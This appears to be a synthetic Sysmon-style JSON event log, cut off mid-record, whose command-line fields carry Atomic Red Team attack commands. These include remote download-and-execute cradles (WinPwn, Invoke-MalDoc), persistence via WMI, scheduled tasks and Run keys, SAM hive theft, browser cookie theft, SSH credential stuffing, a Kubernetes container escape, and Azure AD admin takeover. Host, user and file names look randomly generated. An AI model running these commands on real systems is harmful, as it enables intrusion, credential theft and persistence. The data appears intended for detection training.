    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-33.mckee-sosa.com",
        "User": "jfletcher",
        "ProcessID": 2519,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nGPOAudit -noninteractive -consoleoutput\",",
        "LogonID": 405437,
        "LogonGuid": "c8206624-484d-4475-b344-8d09c4e68648",
        "SourceProcessID": 9246,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\much..exe",
        "DestinationProcessID": 2133,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\character..dll",
        "UtcTime": "2024-05-17T01:36:51.758825Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-13.rios.com",
        "User": "tonya70",
        "ProcessID": 4368,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"tail /var/log/ufw.log\\n\",",
        "LogonID": 277302,
        "LogonGuid": "c927ed77-ac8b-4e46-b5a4-835e1e835547",
        "SourceProcessID": 3231,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\finally..dll",
        "DestinationProcessID": 1606,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\successful..exe",
        "UtcTime": "2024-05-17T01:36:51.759823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-38.miller.com",
        "User": "qrobinson",
        "ProcessID": 4375,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-PSSession -ComputerName #{hostname_to_connect}\\nTest-Connection $env:COMPUTERNAME\\nSet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use -Value \\\"T1086 PowerShell Session Creation and Use\\\"\\nGet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\nRemove-Item -Force $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\n\",",
        "LogonID": 461859,
        "LogonGuid": "52bae784-fcc2-4009-89ea-7dc585d1c9d0",
        "SourceProcessID": 1690,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\himself..dll",
        "DestinationProcessID": 5365,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\significant..exe",
        "UtcTime": "2024-05-17T01:36:51.759823Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-60.barnes.com",
        "User": "kelleyjerry",
        "ProcessID": 9814,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"echo Get-Process | clip\\nGet-Clipboard | iex\\n\",",
        "LogonID": 445973,
        "LogonGuid": "90197927-c785-4091-8978-5a8d62d17c7d",
        "SourceProcessID": 9173,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\wrong..exe",
        "DestinationProcessID": 9188,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\but..exe",
        "UtcTime": "2024-05-17T01:36:51.760328Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-93.wallace.com",
        "User": "jameshorton",
        "ProcessID": 7986,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nSnaffler -noninteractive -consoleoutput\",",
        "LogonID": 850821,
        "LogonGuid": "af8b79a7-2000-4395-9add-69fdb27589fa",
        "SourceProcessID": 4811,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\when..exe",
        "DestinationProcessID": 2345,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\better..dll",
        "UtcTime": "2024-05-17T01:36:51.760328Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-70.mata-hansen.com",
        "User": "shearachel",
        "ProcessID": 7145,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"echo \\\"\\\" | \\\"#{plink_file}\\\" \\\"#{vm_host}\\\" -ssh  -l \\\"#{vm_user}\\\" -pw \\\"#{vm_pass}\\\" -m \\\"#{cli_script}\\\"\\n\",",
        "LogonID": 753009,
        "LogonGuid": "b920cdf1-bd13-40da-a777-8746ca791206",
        "SourceProcessID": 3978,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\should..exe",
        "DestinationProcessID": 5724,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\population..dll",
        "UtcTime": "2024-05-17T01:36:51.760328Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-87.taylor.com",
        "User": "rdavis",
        "ProcessID": 8571,
        "ProcessName": "nc.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -sc exchaddresses #{optional_args}\\n\",",
        "LogonID": 478255,
        "LogonGuid": "07d29f3e-b653-4527-a3e1-d4ac0a8ace58",
        "SourceProcessID": 8926,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\there..exe",
        "DestinationProcessID": 8946,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\tax..exe",
        "UtcTime": "2024-05-17T01:36:51.760328Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-13.mckenzie.com",
        "User": "jasonhicks",
        "ProcessID": 6254,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"find / -path \\\"*/Firefox/Profiles/*/places.sqlite\\\" -exec echo {} >> #{output_file} \\\\;\\ncat #{output_file} 2>/dev/null\\n\",",
        "LogonID": 317858,
        "LogonGuid": "81a8b009-a5ae-4d6d-b9fc-d8d28be5b460",
        "SourceProcessID": 2116,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\authority..exe",
        "DestinationProcessID": 6171,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\tree..exe",
        "UtcTime": "2024-05-17T01:36:51.760328Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-66.moran.org",
        "User": "vmiller",
        "ProcessID": 4236,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo sed -i \\\"\\\" \\\"#{index}s,^,#{pam_rule}\\\\n,g\\\" #{path_to_pam_conf}\\n\",",
        "LogonID": 931211,
        "LogonGuid": "e0da263c-e8d5-453b-b5b3-5fa7a792e278",
        "SourceProcessID": 3138,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\several..dll",
        "DestinationProcessID": 5160,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\reason..dll",
        "UtcTime": "2024-05-17T01:36:51.761335Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-07.johnson.com",
        "User": "ylee",
        "ProcessID": 8983,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\\n                EventNameSpace='root\\\\CimV2';\\n                QueryLanguage=\\\"WQL\\\";\\n                Query=\\\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\\\"};\\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\\n\\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\\n                CommandLineTemplate=\\\"$($Env:SystemRoot)\\\\System32\\\\notepad.exe\\\";}\\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\\n\\n$FilterToConsumerArgs = @{\\nFilter = [Ref] $Filter;\\nConsumer = [Ref] $Consumer;\\n}\\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\\n\",",
        "LogonID": 352923,
        "LogonGuid": "ff0b3064-7c05-4d36-9575-359802a04f63",
        "SourceProcessID": 8438,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\technology..exe",
        "DestinationProcessID": 3226,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\painting..exe",
        "UtcTime": "2024-05-17T01:36:51.761335Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-63.fletcher.org",
        "User": "clarkpeter",
        "ProcessID": 7089,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\csc.exe /out:\\\"$env:localappdata\\\\Microsoft\\\\WindowsApps\\\\Get-Variable.exe\\\" \\\"PathToAtomicsFolder\\\\T1574.008\\\\bin\\\\calc.cs\\\"\\nPowershell -noprofile\\n\",",
        "LogonID": 597959,
        "LogonGuid": "02fa6308-4e10-48e0-94d4-580680df0fb1",
        "SourceProcessID": 4529,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\expert..dll",
        "DestinationProcessID": 8959,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\million..dll",
        "UtcTime": "2024-05-17T01:36:51.761335Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-54.singh.com",
        "User": "jacobingram",
        "ProcessID": 2587,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"1..#{limit} | % { \\n try { [System.IO.File]::Copy(\\\"\\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy$_\\\\Windows\\\\System32\\\\config\\\\#{target_hive}\\\" , \\\"$env:TEMP\\\\#{target_hive}vss$_\\\", \\\"true\\\") } catch {}\\n ls \\\"$env:TEMP\\\\#{target_hive}vss$_\\\" -ErrorAction Ignore\\n}\\n\",",
        "LogonID": 801777,
        "LogonGuid": "f0743308-1e85-4088-8711-043e11b7c13d",
        "SourceProcessID": 8247,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\throw..exe",
        "DestinationProcessID": 8036,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\imagine..exe",
        "UtcTime": "2024-05-17T01:36:51.761335Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-87.zuniga-lawrence.net",
        "User": "amandahughes",
        "ProcessID": 5985,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"killall 'Google Chrome'\\nsleep 1\\nopen -a \\\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\\\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\\nsleep 1\\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337\",",
        "LogonID": 647965,
        "LogonGuid": "046050f4-dc33-4ca2-933e-02868c0399f2",
        "SourceProcessID": 9952,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\always..exe",
        "DestinationProcessID": 8878,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\far..dll",
        "UtcTime": "2024-05-17T01:36:51.762338Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-80.grant.org",
        "User": "xchan",
        "ProcessID": 4934,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"schtasks /create /tn \\\"T1053_005_OnLogon\\\" /sc onlogon /tr \\\"cmd.exe /c calc.exe\\\"\\nschtasks /create /tn \\\"T1053_005_OnStartup\\\" /sc onstart /ru system /tr \\\"cmd.exe /c calc.exe\\\"\\n\",",
        "LogonID": 781052,
        "LogonGuid": "ead0a202-3fd2-45a5-8edc-bb053a54d39c",
        "SourceProcessID": 3979,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\region..dll",
        "DestinationProcessID": 8559,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\human..dll",
        "UtcTime": "2024-05-17T01:36:51.762338Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-74.williamson-whitehead.com",
        "User": "sean55",
        "ProcessID": 4303,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"hklm\\\\system\\\\currentcontrolset\\\\control\\\\lsa\\\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\\n\",",
        "LogonID": 483637,
        "LogonGuid": "c0bb80cb-52f6-4b6b-bcd2-cc9d7455e15a",
        "SourceProcessID": 9849,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\feel..exe",
        "DestinationProcessID": 5901,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\box..exe",
        "UtcTime": "2024-05-17T01:36:51.762338Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-11.garcia-taylor.biz",
        "User": "david49",
        "ProcessID": 9654,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"cp $HISTFILE $HISTFILE.OLD\\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\\necho \\\"\\\" > $HISTFILE\\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \\\"$HISTFILE is larger than 1k\\\"; fi\\nls -la $HISTFILE \\ncat $HISTFILE\\nhistory -c \\nif [ $(history |wc -l) -eq 1 ]; then echo \\\"History cache cleared\\\"; fi\\n\",",
        "LogonID": 129994,
        "LogonGuid": "9480ab25-677e-4e8a-8d5d-02d4d866669e",
        "SourceProcessID": 6640,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\new..dll",
        "DestinationProcessID": 7080,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\successful..dll",
        "UtcTime": "2024-05-17T01:36:51.762338Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-03.martin.com",
        "User": "nelsondarius",
        "ProcessID": 5481,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\\nif [ -z \\\"${FILE}\\\" ] ; then echo \\\"No loginwindow plist file found\\\" && exit 1 ; fi\\necho save backup copy to /tmp/\\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\\necho before\\nplutil -p ${FILE}\\necho overwriting...\\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\\n\",",
        "LogonID": 348626,
        "LogonGuid": "28f46ccd-3ffe-462f-a173-8dffc00ee484",
        "SourceProcessID": 8496,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\pay..exe",
        "DestinationProcessID": 8185,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\bed..exe",
        "UtcTime": "2024-05-17T01:36:51.762338Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-49.carrillo.org",
        "User": "zayala",
        "ProcessID": 6399,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\\\"spec\\\":{\\\"hostPID\\\": true, \\\"containers\\\":[{\\\"name\\\":\\\"1\\\",\\\"image\\\":\\\"alpine\\\",\\\"command\\\":[\\\"nsenter\\\",\\\"--mount=/proc/1/ns/mnt\\\",\\\"--\\\",\\\"/bin/bash\\\"],\\\"stdin\\\": true,\\\"tty\\\":true,\\\"securityContext\\\":{\\\"privileged\\\":true}}]}}'\\n\",",
        "LogonID": 854278,
        "LogonGuid": "b1418712-aa9e-4650-8fe6-632a36ca0524",
        "SourceProcessID": 7804,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\walk..dll",
        "DestinationProcessID": 3996,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\appear..exe",
        "UtcTime": "2024-05-17T01:36:51.762338Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-69.morris.biz",
        "User": "ecasey",
        "ProcessID": 1212,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1070.001\\\\src\\\\T1070.001-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"ClearLogs\\\"\\n\",",
        "LogonID": 318927,
        "LogonGuid": "baf940d1-59b6-46a7-98de-2d3db0cc727b",
        "SourceProcessID": 5525,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\control..exe",
        "DestinationProcessID": 7728,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\loss..dll",
        "UtcTime": "2024-05-17T01:36:51.763338Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-06.hicks-garza.info",
        "User": "christinajackson",
        "ProcessID": 2090,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$Shell = New-Object -ComObject (\\\"WScript.Shell\\\")\\n$ShortCut = $Shell.CreateShortcut(\\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\\")\\n$ShortCut.TargetPath=\\\"cmd.exe\\\"\\n$ShortCut.WorkingDirectory = \\\"C:\\\\Windows\\\\System32\\\";\\n$ShortCut.WindowStyle = 1;\\n$ShortCut.Description = \\\"T1547.009.\\\";\\n$ShortCut.Save()\\n\\n$Shell = New-Object -ComObject (\\\"WScript.Shell\\\")\\n$ShortCut = $Shell.CreateShortcut(\\\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1547.009.lnk\\\")\\n$ShortCut.TargetPath=\\\"cmd.exe\\\"\\n$ShortCut.WorkingDirectory = \\\"C:\\\\Windows\\\\System32\\\";\\n$ShortCut.WindowStyle = 1;\\n$ShortCut.Description = \\\"T1547.009.\\\";\\n$ShortCut.Save()\\n\",",
        "LogonID": 769831,
        "LogonGuid": "bbd29226-82fa-41f1-8717-0d8a9a9ed6c6",
        "SourceProcessID": 7336,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\individual..exe",
        "DestinationProcessID": 4080,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\address..dll",
        "UtcTime": "2024-05-17T01:36:51.763338Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-48.wilson-pope.com",
        "User": "latkinson",
        "ProcessID": 6091,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"cp $PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt /tmp/\\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\\\":\\\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\\\":\\\" -f1`@#{target_host};done\\n\",",
        "LogonID": 674025,
        "LogonGuid": "15a4bbc0-6553-4ae1-96fa-6a9a6167bfe2",
        "SourceProcessID": 6239,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\later..exe",
        "DestinationProcessID": 1360,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\pressure..dll",
        "UtcTime": "2024-05-17T01:36:51.763338Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-57.moreno-munoz.com",
        "User": "samantha82",
        "ProcessID": 7991,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Copy-Item \\\"$PathToAtomicsFolder\\\\T1547.002\\\\bin\\\\package.dll\\\" C:\\\\Windows\\\\System32\\\\\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\" /v \\\"Authentication Packages\\\" /t REG_MULTI_SZ /d \\\"msv1_0\\\\0package.dll\\\" /f\\n\",",
        "LogonID": 691202,
        "LogonGuid": "9be4bafe-ff67-470f-857e-a4743f6ba8a2",
        "SourceProcessID": 6996,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\over..exe",
        "DestinationProcessID": 3649,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\indeed..dll",
        "UtcTime": "2024-05-17T01:36:51.763338Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-06.stevens.info",
        "User": "ochoadiane",
        "ProcessID": 8851,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"Get-Content \\\"#{image_file}\\\", \\\"#{tar_file}\\\" -Encoding byte -ReadCount 0 | Set-Content \\\"#{new_image_file}\\\" -Encoding byte\\n\",",
        "LogonID": 510418,
        "LogonGuid": "69347b36-e073-4648-ae74-b269f93c1368",
        "SourceProcessID": 2804,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\fire..dll",
        "DestinationProcessID": 5320,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\ball..dll",
        "UtcTime": "2024-05-17T01:36:51.763338Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-35.duncan-chase.com",
        "User": "markbell",
        "ProcessID": 8611,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -exec bypass -noprofile \\\"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\\\"\\n\",",
        "LogonID": 565568,
        "LogonGuid": "be4d7b23-acb7-4d22-aa8d-9cade7bfb411",
        "SourceProcessID": 3857,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\against..exe",
        "DestinationProcessID": 6205,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\stage..dll",
        "UtcTime": "2024-05-17T01:36:51.764335Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-91.medina-hicks.net",
        "User": "cmiller",
        "ProcessID": 6813,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\\n\",",
        "LogonID": 271721,
        "LogonGuid": "2e7f5a5e-a78c-4a48-94e2-18722b097bb3",
        "SourceProcessID": 9107,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\scene..dll",
        "DestinationProcessID": 9567,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\everything..exe",
        "UtcTime": "2024-05-17T01:36:51.764335Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-36.davis-elliott.com",
        "User": "jamie69",
        "ProcessID": 1373,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nbrowserpwn -consoleoutput -noninteractive\",",
        "LogonID": 327710,
        "LogonGuid": "b7f9739b-3f07-4840-818c-f92c9383af02",
        "SourceProcessID": 1198,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\behavior..exe",
        "DestinationProcessID": 6474,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\especially..dll",
        "UtcTime": "2024-05-17T01:36:51.764335Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-70.skinner.com",
        "User": "clarkheather",
        "ProcessID": 3397,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"shutdown -h #{timeout}\\n\",",
        "LogonID": 430855,
        "LogonGuid": "427c88df-ebf3-42dc-afdc-537815f0b105",
        "SourceProcessID": 7605,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\where..dll",
        "DestinationProcessID": 8864,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\billion..dll",
        "UtcTime": "2024-05-17T01:36:51.764335Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-77.barr.org",
        "User": "stevenpearson",
        "ProcessID": 5456,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Import-Module MSOnline\\nImport-Module AzureAD\\n$password = ConvertTo-SecureString -String \\\"#{auth_password}\\\" -AsPlainText -Force\\n$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{auth_username}\\\", $password\\n$targetsecurepw = ConvertTo-SecureString -String \\\"#{target_password}\\\" -AsPlainText -Force\\nConnect-MsolService -Credential $credential -ErrorAction:SilentlyContinue\\nConnect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue\\n\\n#Saving the ObjectId of the target_user into a variable\\n$target_objid = Get-AzureADUser -filter \\\"userPrincipalName eq '#{target_user}'\\\" | Select-Object -ExpandProperty ObjectId\\n\\n#Reset the password of the target_user\\nSet-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue\\n\\n#Adding target_user\\nAdd-MsolRoleMember -RoleName \\\"Company Administrator\\\" -RoleMemberEmailAddress \\\"#{target_user}\\\"\\nAdd-MsolRoleMember -RoleName \\\"Global Reader\\\" -RoleMemberEmailAddress \\\"#{target_user}\\\"\\n\",",
        "LogonID": 243647,
        "LogonGuid": "c130f30c-2fa2-403f-a4ed-bad138dd70a3",
        "SourceProcessID": 9178,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\its..exe",
        "DestinationProcessID": 5142,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\why..dll",
        "UtcTime": "2024-05-17T01:36:51.764335Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-46.lowe.com",
        "User": "elizabeth17",
        "ProcessID": 5681,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"ls -a >> #{output_file}\\nif [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;\\nfile */* *>> #{output_file}\\ncat #{output_file} 2>/dev/null\\nfind . -type f\\nls -R | grep \\\":$\\\" | sed -e 's/:$//' -e 's/[^-][^\\\\/]*\\\\//--/g' -e 's/^/ /' -e 's/-/|/'\\nlocate *\\nwhich sh\\n\",",
        "LogonID": 334727,
        "LogonGuid": "c5457eee-2f6a-4546-a569-89d10f503d05",
        "SourceProcessID": 6414,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\onto..exe",
        "DestinationProcessID": 6254,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\full..dll",
        "UtcTime": "2024-05-17T01:36:51.765334Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-00.cortez.com",
        "User": "williamsolivia",
        "ProcessID": 1293,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"xcopy /I /Y \\\"#{web_shells}\\\" #{web_shell_path}\\n\",",
        "LogonID": 630142,
        "LogonGuid": "82dcdd3e-8950-4849-bd8e-b08e9c5530f9",
        "SourceProcessID": 1483,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\medical..exe",
        "DestinationProcessID": 7107,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\ability..exe",
        "UtcTime": "2024-05-17T01:36:51.765334Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-46.garcia.net",
        "User": "pierceernest",
        "ProcessID": 5573,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"if (!(Test-Path -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\\\")){\\n  New-Item -ItemType Key -Path  \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\\\"\\n}\\nSet-ItemProperty -Path  \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run\\\" -Name \\\"#{target_key_value_name}\\\" -Value \\\"#{payload}\\\"\\n\",",
        "LogonID": 515746,
        "LogonGuid": "5360af12-76c7-4580-8707-d589d9c075b9",
        "SourceProcessID": 4531,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\wonder..exe",
        "DestinationProcessID": 9278,
